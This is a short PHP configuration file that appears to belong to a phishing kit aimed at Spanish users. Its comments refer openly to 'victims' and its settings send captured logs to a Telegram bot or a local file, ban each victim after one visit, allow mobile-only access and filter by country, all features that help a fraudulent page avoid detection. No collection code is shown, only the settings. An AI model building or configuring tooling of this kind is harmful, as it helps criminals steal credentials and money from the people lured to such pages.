<?php
$rand_hash = md5($_SERVER['REMOTE_ADDR']);
$session = md5(rand(100, 999));




// Telegram Settings
$telegram = 0;
$token = ""; 
$chatID = "";

// Save to file
$saveLog = 1; // Save the Logs to file

// Settings
$oneTime = 1; // One Time Mode: Ban victim from accessing the page after completing
$mobileOnly = 0; // The victims can access only from their phone.
$source_folder = "es";

// Country Settings
$country_check = 0;
$countries_allowed = ['ES'];





function now() {
    date_default_timezone_set('GMT');
    return date("d/m/Y h:i:sa");
}
?>